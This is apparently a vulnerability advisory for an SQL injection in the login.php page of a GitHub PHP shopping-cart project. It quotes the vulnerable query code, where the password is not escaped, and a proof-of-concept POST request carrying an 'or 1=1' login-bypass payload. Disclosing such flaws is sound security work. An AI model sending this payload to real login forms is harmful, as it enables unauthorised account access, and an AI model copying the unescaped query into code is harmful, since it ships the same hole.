# Surya2Developer / Online_shopping_-system - login.php SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/Surya2Developer/Online_shopping_-system

## Affected Component
> /login.php

## Code
```php
if(isset($_POST["email"]) && isset($_POST["password"])){
	$email = mysqli_real_escape_string($con,$_POST["email"]);
	$password = $_POST["password"];
	$sql = "SELECT * FROM user_info WHERE email = '$email' AND password = '$password'";
	$run_query = mysqli_query($con,$sql);
	$count = mysqli_num_rows($run_query);
    $row = mysqli_fetch_array($run_query);
		$_SESSION["uid"] = $row["user_id"];
		$_SESSION["name"] = $row["first_name"];
		$ip_add = getenv("REMOTE_ADDR");
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /login.php HTTP/1.1
Host: [REDACTED]
Content-Length: 68
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: [REDACTED]
sec-ch-ua-platform: "macOS"
Origin: [REDACTED]
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: [REDACTED]
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close

email=nochizplz%40nochizplz.com&password=nochizplz'+or+1%3d1+limit+1%23
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/83d29474-9f85-418d-82f5-bdb6a5e23067)
